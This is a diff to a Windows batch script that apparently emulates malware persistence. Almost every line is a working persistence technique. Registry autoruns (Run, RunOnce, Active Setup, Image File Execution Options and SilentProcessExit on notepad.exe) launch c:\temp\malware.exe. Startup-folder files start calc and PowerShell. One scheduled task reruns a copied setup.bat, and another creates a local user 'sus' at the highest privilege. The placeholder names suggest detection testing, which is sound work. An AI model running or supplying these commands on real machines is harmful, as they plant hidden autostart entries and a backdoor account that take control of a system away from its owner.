@@ -24,8 +24,11 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 ::--------------------------------------
 setlocal
+
+:: Copy setup.bat into temp folder
 copy /Y %~dp0setup.bat "C:\Windows\Temp\setup.bat"
 
+:: Create registry keys for autorun
 reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 0x200 /f
 reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 0x1 /f
 reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG_SZ /d c:\temp\malware.exe /f
@@ -35,6 +38,12 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Malware /t REG_S
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Malware /t REG_SZ /d c:\temp\malware.exe /f
 reg add "HKLM\Software\Microsoft\Active Setup\Installed Components\{Malware}" /v StubPath /t REG_SZ /d c:\temp\malware.exe /f
 
+:: Create files for Startup
+
+echo "C:\Windows\System32\calc.exe" > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\calc.bat"
+echo "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" > "%appdata%\Microsoft\Windows\Start Menu\Programs\StartUp\powershell.bat"
+
+:: Create scheduled tasks
 SCHTASKS /CREATE /SC HOURLY /TN "System\Setup" /TR "C:\Windows\Temp\setup.bat" /F
 SCHTASKS /CREATE /SC DAILY /TN "System\Nothing" /TR "cmd /C 'net user sus sus /add'" /RL HIGHEST /F
 
